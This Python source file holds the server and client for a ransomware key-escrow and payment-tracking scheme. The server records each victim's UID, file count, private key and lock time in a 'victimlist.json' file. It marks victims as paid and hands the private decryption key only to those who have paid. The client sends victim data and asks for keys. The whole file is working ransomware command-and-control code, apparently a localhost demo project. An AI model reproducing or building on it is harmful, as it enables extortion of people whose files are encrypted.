import socket
import threading
import json
import threading
import os

class MySocket:
    class Server:
        def __init__(self):
            self.__hostIP = "127.0.0.1"
            self.__tcpPort = 8080
            self.__tcpSocket = None
            self.__udpSocket = None
            self.stopEvent = threading.Event()

        def startTCPServer(self):
            def handleClient(clientSocket,address):
                def readJson(path):
                    with open(path,"r", encoding='utf-8') as file:
                        data = json.load(file)
                    return data
                def writeJson(path,data):
                    with open(path,"w", encoding='utf-8') as file:
                        json.dump(data,file,indent=4)

                testPath,__rmfolderPath = "./data/victimlist.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/victimlist.json"
                req = clientSocket.recv(4096)
                req = json.loads(req.decode("utf-8"))
                print(f"Victim Data:{req}")
                victimList = readJson(testPath)

                if req["getPrivate"] == True:
                    for victim in victimList:
                        if victim["UID"] == req["UID"] and victim["paid"] == True:
                            privateKey = json.dumps({"privateKey": victim["privateKey"]})
                            clientSocket.send(privateKey.encode("utf-8"))
                            break
                else:
                    if req["padding"] == True:
                        UID = req["UID"]
                        for i in range(len(victimList)):
                            if victimList[i]["UID"] == UID:
                                victimList[i]["paid"] = True
                                break
                    else:
                        newVictimData = {
                            "UID": req["UID"],
                            "fileNumber": req["fileNumber"],
                            "privateKey": req["privateKey"],
                            "date": req["lockTime"],
                            "paid": False
                        }
                        victimList.append(newVictimData)
                    writeJson(testPath,victimList)
                
                clientSocket.close()

            self.__tcpSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.__tcpSocket.bind((self.__hostIP,self.__tcpPort))
            self.__tcpSocket.listen(5)
            print("start TCP server")

            while not self.stopEvent.is_set():
                try:
                    clientSocket,address = self.__tcpSocket.accept()
                    handleClient(clientSocket,address)
                except OSError:
                    break


        def stopTCPServer(self):
            self.stopEvent.set()
            if(self.__tcpSocket):
                self.__tcpSocket.close()

        # def startUDPServer(self):
        #     def handleClient():
        #         self.__udpSocket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        #         self.__udpSocket.bind((self.__hostIP,self.__udpPort))
        #         print("start UPD server")

        #         while True:
        #             data,address = self.__udpSocket.recvfrom(4096)
        #             frame = np.frombuffer(data,dtype=np.uint8)
        #             frame = cv2.imdecode(frame,cv2.IMREAD_COLOR)
        #             frame = frame.resize((480,360))
        #             frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB) 
        #             img = Image.fromarray(frame)
        #             img = ImageTk.PhotoImage(image=img)
        #             self.video = img
                
        #     threading.Thread(target=handleClient).start()

    class Client:
        def __init__(self,):
            self.__serverIP = "127.0.0.1"
        
        def sendTCPMeg(self,data,port):
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((self.__serverIP,port))
            
            connect = False
            while not connect:
                try:
                    s.send(json.dumps(data).encode("utf-8"))
                    connect = True
                    print(connect)
                except ConnectionResetError as e:
                    pass

            #s.send(data.encode())

        def sendGetPrivateKey(self, uid, port):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.__serverIP, port))

            data = {
                "getPrivate": True,
                "UID": uid
            }
            connect = False
            while not connect:
                try:
                    s.send(json.dumps(data).encode("utf-8"))
                    connect = True
                    print(connect)
                except ConnectionResetError as e:
                    pass

            res = s.recv(4096)
            if res:
                res = json.loads(res.decode("utf-8"))["privateKey"]
                return res
            else:
                return None